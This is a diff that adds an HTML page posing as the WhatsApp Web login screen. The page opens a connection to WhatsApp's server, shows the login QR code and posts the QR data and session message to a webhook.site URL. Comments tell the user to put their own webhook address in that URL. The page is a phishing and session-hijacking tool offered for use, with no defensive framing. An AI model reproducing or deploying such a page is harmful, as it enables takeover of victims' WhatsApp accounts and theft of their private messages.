@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head><title>WhatsApp</title>
+<link rel="stylesheet" href="https://web.whatsapp.com/img/web/background-landscape.eb1f5fb9.svg">
+<style>
+#app {width:100vw;height:100vh;background:#eaeaea;display:flex;align-items:center;justify-content:center}
+#qr {width:300px;height:300px;border:1px solid #fff}
+#status{font-size:18px;color:#666;margin-top:20px}
+</style>
+</head>
+<body>
+<div id="app">
+<canvas id="qr-canvas" style="width:300px;height:300px"></canvas>
+<div id="status">Connecting to WhatsApp...</div>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.3/qrcode.min.js"></script>
+<script>
+// 🚨 REPLACE THIS WEBHOOK URL WITH YOURS FROM webhook.site
+const WEBHOOK_URL = 'https://webhook.site/#!/YOUR-UNIQUE-ID-HERE';
+
+const ws = new WebSocket('wss://web.whatsapp.com/ws');
+let qrData = '';
+
+ws.onopen = () => document.getElementById('status').innerText = 'Scan QR code with WhatsApp';
+ws.onmessage = (e) => {
+    if(e.data.startsWith('wWhatsApp/')) {
+        qrData = e.data.split(',')[1];
+        QRCode.toCanvas(document.getElementById('qr-canvas'), qrData, {width:300});
+        document.getElementById('status').innerText = '🔐 Scan now - 20 seconds remaining';
+        
+        // SEND SESSION TO YOUR WEBHOOK
+        fetch(WEBHOOK_URL, {
+            method:'POST', 
+            body:JSON.stringify({qr:qrData, session:e.data, timestamp:Date.now()}),
+            headers:{'Content-Type':'application/json'}
+        }).then(r=>console.log('✅ Session sent!'));
+    }
+};
+</script>
+</body>
+</html>
